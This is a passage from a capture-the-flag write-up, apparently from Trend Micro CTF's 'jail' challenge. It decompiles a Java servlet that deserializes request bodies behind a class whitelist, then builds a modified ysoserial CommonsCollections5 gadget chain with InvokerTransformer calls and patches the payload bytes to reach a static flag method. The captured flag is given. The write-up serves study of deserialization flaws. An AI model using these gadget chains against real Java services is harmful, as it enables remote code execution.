+<pre class="hljs"><code><span class="hljs-comment">// Server.java</span>
+<span class="hljs-meta">@WebServlet</span>({<span class="hljs-string">"/jail"</span>})
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Server</span>
+  <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span>
+</span>{
+  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">long</span> serialVersionUID = <span class="hljs-number">1L</span>; 
+
+  <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Server</span><span class="hljs-params">()</span> </span>{}
+
+  <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span>
+    <span class="hljs-keyword">throws</span> ServletException, IOException
+  </span>{
+    <span class="hljs-keyword">try</span> 
+    { 
+      ServletInputStream is = request.getInputStream();
+      ObjectInputStream ois = <span class="hljs-keyword">new</span> CustomOIS(is);
+      Person person = (Person)ois.readObject();
+      ois.close();
+      response.getWriter().append(<span class="hljs-string">"Sorry "</span> + person.name + <span class="hljs-string">". I cannot let you have the Flag!."</span>);
+    } <span class="hljs-keyword">catch</span> (Exception e) {
+      response.setStatus(<span class="hljs-number">500</span>);
+      e.printStackTrace(response.getWriter());
+    } 
+  }
+}                </code></pre><pre class="hljs"><code><span class="hljs-comment">// CustomOIS.java</span>
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CustomOIS</span>
+  <span class="hljs-keyword">extends</span> <span class="hljs-title">ObjectInputStream</span>
+</span>{
+  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String[] whitelist = { <span class="hljs-string">"javax.management.BadAttributeValueExpException"</span>,
+    <span class="hljs-string">"java.lang.Exception"</span>,
+    <span class="hljs-string">"java.lang.Throwable"</span>,
+    <span class="hljs-string">"[Ljava.lang.StackTraceElement;"</span>,
+    <span class="hljs-string">"java.lang.StackTraceElement"</span>,
+    <span class="hljs-string">"java.util.Collections$UnmodifiableList"</span>,
+    <span class="hljs-string">"java.util.Collections$UnmodifiableCollection"</span>,
+    <span class="hljs-string">"java.util.ArrayList"</span>,
+    <span class="hljs-string">"org.apache.commons.collections.keyvalue.TiedMapEntry"</span>,
+    <span class="hljs-string">"org.apache.commons.collections.map.LazyMap"</span>,
+    <span class="hljs-string">"org.apache.commons.collections.functors.ChainedTransformer"</span>,
+    <span class="hljs-string">"[Lorg.apache.commons.collections.Transformer;"</span>,
+    <span class="hljs-string">"org.apache.commons.collections.functors.ConstantTransformer"</span>,
+    <span class="hljs-string">"com.trendmicro.jail.Flag"</span>,
+    <span class="hljs-string">"org.apache.commons.collections.functors.InvokerTransformer"</span>,
+    <span class="hljs-string">"[Ljava.lang.Object;"</span>,
+    <span class="hljs-string">"[Ljava.lang.Class;"</span>,
+    <span class="hljs-string">"java.lang.String"</span>,
+    <span class="hljs-string">"java.lang.Object"</span>,
+    <span class="hljs-string">"java.lang.Integer"</span>,
+    <span class="hljs-string">"java.lang.Number"</span>,
+    <span class="hljs-string">"java.util.HashMap"</span>,
+    <span class="hljs-string">"com.trendmicro.Person"</span> };
+
+  <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">CustomOIS</span><span class="hljs-params">(ServletInputStream is)</span> <span class="hljs-keyword">throws</span> IOException </span>{
+    <span class="hljs-keyword">super</span>(is);
+  }
+
+  <span class="hljs-keyword">public</span> Class&lt;?&gt; resolveClass(ObjectStreamClass des) <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException
+  {
+    <span class="hljs-keyword">if</span> (!Arrays.asList(whitelist).contains(des.getName())) {
+      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ClassNotFoundException(<span class="hljs-string">"Cannot deserialize "</span> + des.getName());
+    }
+    <span class="hljs-keyword">return</span> <span class="hljs-keyword">super</span>.resolveClass(des);
+  }
+}
+</code></pre><pre class="hljs"><code><span class="hljs-comment">// Person.java and jail/Flag.java</span>
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span> </span>{
+  <span class="hljs-keyword">public</span> String name;
+
+  <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Person</span><span class="hljs-params">(String name)</span> </span>{
+    <span class="hljs-keyword">this</span>.name = name;
+  }
+}
+
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span> </span>{
+  <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">long</span> serialVersionUID = <span class="hljs-number">6119813099625710381L</span>;
+
+  <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Flag</span><span class="hljs-params">()</span> </span>{}
+
+  <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">getFlag</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>{ <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> Exception(<span class="hljs-string">"&lt;FLAG GOES HERE&gt;"</span>); }
+}
+</code></pre><p>I use <a href="http://jd.benow.ca/">jd-gui</a> to decompile the java class files.</p>
+<p>The objective is to invoke <code>Flag.getFlag()</code>. However, it&#39;s tricky because:</p>
+<ol class="list">
+<li>getFlag() is static (class method)</li>
+<li>Server.java only accesses the member <code>person.name</code>.</li>
+<li>The server doesn&#39;t invoke any other method.</li>
+</ol>
+<p>So we quickly realize it&#39;s not possible to call <code>getFlag()</code>. We need RCE / more powerful exploit.</p>
+<p>We note that the <code>CustomOIS.java</code> uses a whitelist to check the resolved class name, but it&#39;s really suspicous because some weird classes are in the whiltelist, like <code>javax.management.BadAttributeValueExpException</code>.</p>
+<p>With a quick Google we found <a href="https://github.com/frohoff/ysoserial">ysoserial</a> can generate RCE payload for <code>commons-collections:3.1</code>, which is the dependency of the server. </p>
+<p>Actually the <code>CommonsCollections5</code> utilizes those classes in the whitelist to trigger RCE, but <code>Java.lang.Runtime</code> is not in the whilelist. I think it&#39;s not able to RCE.</p>
+<p>Though we cannot call <code>Runtime.exec()</code>, at least we can try to invoke <code>Flag.getFlag()</code>.</p>
+<p>Here is the modified version of <a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections5.java">CommonCollection5.java</a>:</p>
+<pre class="hljs"><code><span class="hljs-comment">// Some of the code is omitted.</span>
+...
+
+<span class="hljs-keyword">import</span> java.io.Serializable;
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span> </span>{
+  <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">long</span> serialVersionUID = <span class="hljs-number">6119813099625710381L</span>;
+  <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Flag</span><span class="hljs-params">()</span> </span>{}
+  <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">getFlag</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>{ <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> Exception(<span class="hljs-string">"&lt;FLAG GOES HERE&gt;"</span>); }                                             
+}
+
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CommonsCollections5</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">PayloadRunner</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">ObjectPayload</span>&lt;<span class="hljs-title">BadAttributeValueExpException</span>&gt; </span>{
+
+  <span class="hljs-function"><span class="hljs-keyword">public</span> BadAttributeValueExpException <span class="hljs-title">getObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String command)</span> <span class="hljs-keyword">throws</span> Exception </span>{
+    <span class="hljs-keyword">final</span> String[] execArgs = <span class="hljs-keyword">new</span> String[] { command };
+    <span class="hljs-comment">// inert chain for setup</span>
+    <span class="hljs-keyword">final</span> Transformer transformerChain = <span class="hljs-keyword">new</span> ChainedTransformer(
+            <span class="hljs-keyword">new</span> Transformer[]{ <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>) });
+    <span class="hljs-comment">// real chain for after setup</span>
+    <span class="hljs-keyword">final</span> Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[] {
+        <span class="hljs-keyword">new</span> ConstantTransformer(Flag.class), <span class="hljs-comment">// Flag class here </span>
+        <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">"getMethod"</span>, <span class="hljs-keyword">new</span> Class[] {
+          String.class, Class[].class }, <span class="hljs-keyword">new</span> Object[] {
+          <span class="hljs-string">"getFlag"</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>] }), <span class="hljs-comment">// invoke static method getFlag</span>
+        <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">"invoke"</span>, <span class="hljs-keyword">new</span> Class[] {
+          Object.class, Object[].class }, <span class="hljs-keyword">new</span> Object[] {
+          <span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>] }),
+        <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>) };
+
+...
+</code></pre><p>We have generate the payload, but the class name of Flag is incorrect; it should be <code>com.trendmicro.jail.Flag</code>. Let&#39;s use Python to do the replacement trick:</p>
+<pre class="hljs"><code><span class="hljs-comment"># The first byte is the length of the class name</span>
+replace(<span class="hljs-string">b'\x17ysoserial.payloads.Flag'</span>,<span class="hljs-string">b'\x18com.trendmicro.jail.Flag'</span>)</code></pre><p>The flag: <code>TMCTF{15nuck9astTheF1agMarsha12day}</code></p>
+        </article>
+      </div>
+    </div>
+  </body>
+</html>
